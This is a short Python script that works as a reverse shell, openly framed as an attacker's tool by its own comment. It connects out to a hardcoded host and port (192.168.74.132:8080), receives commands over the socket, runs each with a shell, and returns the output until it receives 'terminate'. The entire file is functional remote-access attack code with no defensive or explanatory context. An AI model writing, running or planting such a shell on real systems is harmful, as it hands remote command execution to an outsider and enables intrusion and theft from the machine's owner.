#!/usr/bin/python

import socket
import subprocess


ip_addr = "192.168.74.132"
port = 8080

def connect():

            print("[!] Waiting for connection")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_addr,port))
            print("[+] Connected from : ",ip_addr)          

            while True:
                    
                    command = s.recv(1024)

                    if not command:
                            break
                    if b"terminate" in command:
                            s.close()
                            break
                    else:
                            CMD = subprocess.Popen(command.decode().strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                            output_byte = CMD.stdout.read()
                            error_byte = CMD.stderr.read()
                            s.send(output_byte)
                            s.send(error_byte)
                            # print("Server : ",command)       if you want to what attacker typing enable this command

def main():
        connect()

if __name__ == "__main__":
        main()